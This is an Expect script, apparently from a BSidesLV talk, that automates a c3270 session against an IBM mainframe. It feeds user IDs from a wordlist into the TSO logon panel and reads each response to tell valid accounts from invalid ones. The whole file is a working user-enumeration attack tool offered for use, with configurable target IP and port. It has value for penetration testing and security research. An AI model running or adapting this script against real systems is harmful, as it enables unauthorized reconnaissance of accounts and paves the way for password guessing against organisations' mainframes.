#!/usr/bin/expect -f

#######################
# Script to take advantage of TSO disclosing if a UserID is invalid
# May require changing for your specific environment
# Initially developed by @mainframed767 for BSidesLV
# Requirements: C3270 and Expect
# Note: This script is super slow. It's just a proof of concept. 
# Thanks to http://www.kicksfortso.com/same/KooKbooK/KooKbooK-6.htm
#######################


#change to whatver you want
set target "10.10.0.24"			;# Target IP address
set target_port   "23"			;# Target Port
set sleep "2"				;# Change to 1 for faster systems
set userfile "userids.txt"		;# Change to the name of your user listing file
log_user 0    		                ;# if you want to see what it does change this to 1

###########################################################
# End configuration options
###########################################################

puts "//////////////////////////////////////////////////////"
puts "//               I'm in ur mainframe                //"
puts "//               guessin' your users                //"
puts "//////////////////////////////////////////////////////"
puts "//"

set usernames [open $userfile r]
set found "0"

# Initiate a 3270 connction to the $target:$port using C3270
puts "//               Connecting to $target:$target_port"
spawn c3270 -model 3279-2 -once $target:$target_port
sleep $sleep

########################################
# You'll need to customize this for your environment
#######################################

set timeout 5
expect {
 "==>"                                  { set reply tso }
 "Enter your choice==>"                 { set reply tso }
 timeout                                { set reply timeout }
 }


# If it times out
if {![info exists reply]} {
	puts "//"
	puts "//               WARNING:"
	puts "//               Connection to $target:$target_port"
	puts "//               timed out or initial logon screen"
	puts "//               is different and you need to change"	
	puts "//               the script." 
	puts "//"
	puts "//               Quiting!"
	puts "//"
	puts "//////////////////////////////////////////////////////"
 exit
 }

puts "//               Connection Successful"
puts "//"

send "tso\r"
sleep $sleep
send "fake\r" ;# this is the first userid to try. It shouldnt exist and starts the ball rolling
sleep $sleep
#C3270 is now at the TSO/E logon panel, check if first userID was valid it shouldn't be
 expect {
   "not authorized"             	{ set enum failed }
   "Enter current password for"     	{ set enum valid }
   timeout                            	{ set enum timeout }
   }

puts "//               Enumerating through $userfile:"
while {[gets $usernames inline] >= 0} {
	puts -nonewline "//               Trying $inline "
	send "$inline\r"
	expect {
   		"not authorized"             	{ set enum failed }
   		"Enter current password for"     	{ set enum valid }
   	}	
	puts -nonewline "::: $enum"
	if {$enum == "valid"} {
		incr found
		send "\035" ; # do ^] to get to c3270 menu
		expect "c3270>" { sleep 1; send "quit\n"; }
		spawn c3270 -model 3279-2 -once $target:$target_port
		sleep $sleep
		expect {
		 "==>"                                  { set reply tso }
		 "Enter your choice==>"                 { set reply tso }
		 timeout                                { set reply timeout }
		 }	
		send "tso\r"
		sleep $sleep				
		send "fake\r"
		expect {
   			"not authorized"             	{ set enum failed }
   			timeout                            	{ set enum timeout }
   		}
		puts -nonewline " ::: Found!"
	}
	puts ""
	sleep $sleep
}
close $usernames

puts "//"
puts "//               Done!"
puts "//"
puts "//////////////////////////////////////////////////////"
puts "//               Found $found user IDs!!!"
puts "//               Closing Connection to $target:$target_port"
puts "//////////////////////////////////////////////////////"
send "\035" ; # do ^] to get to c3270 menu
expect "c3270>" { sleep 1; send "quit\n"; }
